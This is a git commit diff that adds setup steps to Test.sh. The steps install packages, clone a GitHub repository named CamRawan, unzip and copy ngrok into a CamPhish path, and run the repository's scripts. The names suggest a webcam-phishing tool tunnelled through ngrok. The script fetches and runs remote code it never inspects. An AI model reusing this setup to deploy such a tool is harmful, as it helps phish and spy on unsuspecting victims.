12273cd1e6f24ef7435ec69afddae1a32401a706
BaapG <87407116+Vretlee@users.noreply.github.com>
2021-09-11 10:27:02 +0530

    Update Test.sh
    B

--- Test.sh
+++ Test.sh
@@ -1,3 +1,14 @@
+apt-get update -y
+apt-get upgrade -y
+pkg install python -y
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+bash Vretlee.sh
 git clone https://github.com/Vretlee/CamRawan
+ls
+unzip ngrok.zip
+cp ngrok $HOME/CamPhish/CamRawan
 cd CamRawan
+chmod +x ngrok
 bash Start.sh
